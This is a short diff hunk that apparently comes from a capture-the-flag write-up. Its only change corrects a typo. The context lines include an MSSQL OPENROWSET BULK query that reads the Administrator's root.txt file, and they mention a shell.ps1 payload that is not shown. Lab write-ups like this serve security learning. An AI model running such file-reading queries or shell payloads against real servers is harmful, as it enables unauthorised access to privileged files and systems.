@@ -69,7 +69,7 @@ SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE
 -------------------------------
 
 
-No finished:
+Not finished:
 
 
 Now we create a shell.ps1 on our machine with this payload: 
